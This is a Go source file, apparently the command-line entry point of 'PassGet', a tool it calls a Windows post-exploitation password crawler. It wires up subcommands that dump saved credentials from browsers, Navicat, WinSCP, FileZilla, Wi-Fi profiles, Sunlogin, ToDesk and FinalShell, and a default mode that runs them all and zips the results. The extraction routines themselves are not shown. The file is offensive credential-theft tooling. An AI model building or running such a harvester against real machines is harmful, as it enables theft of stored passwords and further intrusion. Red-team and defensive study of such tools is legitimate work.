package run

import (
	browser2 "PassGet/modules/utils/browser"
	"PassGet/modules/utils/browser/fileutil"
	"fmt"
	"github.com/urfave/cli/v2"
	"log"
	"os"
)

func Run() {
	app := &cli.App{
		Name:            "PassGet",
		Usage:           "A Tool For Windows Post-exploitation Password Crawler",
		UsageText:       "[PassGet.exe (browser/navicat/finalshell/winscp/filezilla/sunlogin/todesk/wifi...)]\nExport password data in windwos\nGithub Link: https://github.com/adeljck/PassGet",
		Version:         "0.0.1b",
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if err := runAll(); err != nil {
				return err
			}
			return nil
		},
		Commands: []*cli.Command{
			{
				Name:  "browser",
				Usage: "Get browser data",
				Action: func(c *cli.Context) error {
					err := GetBrowser()
					if err != nil {
						log.Fatalf("get browser data error %v", err)
					}
					return nil
				},
			}, {
				Name:  "nav",
				Usage: "Get navicat data",
				Action: func(c *cli.Context) error {
					GetNaviCat()
					return nil
				},
			}, {
				Name:  "scp",
				Usage: "Get winscp data",
				Action: func(c *cli.Context) error {
					GetWinSCP()
					return nil
				},
			}, {
				Name:  "filez",
				Usage: "Get filezilla data",
				Action: func(c *cli.Context) error {
					GetFileZilla()
					return nil
				},
			}, {
				Name:  "wifi",
				Usage: "Get wifi data",
				Action: func(c *cli.Context) error {
					GetWiFi()
					return nil
				},
			}, {
				Name:  "sun",
				Usage: "Get sunlogin data",
				Action: func(c *cli.Context) error {
					GetSunlogin()
					return nil
				},
			}, {
				Name:  "tdesk",
				Usage: "Get todesk data",
				Action: func(c *cli.Context) error {
					GetTodesk()
					return nil
				},
			}, {
				Name:  "fshell",
				Usage: "Get finalshell data",
				Action: func(c *cli.Context) error {
					GetFinalShell()
					return nil
				},
			}, {
				Name:  "svn",
				Usage: "Get TortoiseSVN data",
				Action: func(c *cli.Context) error {
					fmt.Println("Working on it")
					return nil
				},
			}, {
				Name:  "xman",
				Usage: "Get Xmanager data",
				Action: func(c *cli.Context) error {
					fmt.Println("Working on it")
					return nil
				},
			}, {
				Name:  "mxterm",
				Usage: "Get MobaltXterm data",
				Action: func(c *cli.Context) error {
					fmt.Println("Working on it")
					return nil
				},
			}, {
				Name:  "scrt",
				Usage: "Get SecureCRT data",
				Action: func(c *cli.Context) error {
					fmt.Println("Working on it")
					return nil
				},
			},
		},
	}
	if err := app.Run(os.Args); err != nil {
		log.Fatalf("run app error %v", err)
	}
}
func runAll() error {
	err := GetBrowser()
	if err != nil {
		return err
	}
	GetTodesk()
	GetSunlogin()
	GetFinalShell()
	GetNaviCat()
	GetFileZilla()
	GetWiFi()
	if err := fileutil.CompressDir(browser2.OutputDir); err != nil {
		log.Printf("compress error %v", err)
	}
	return nil
}
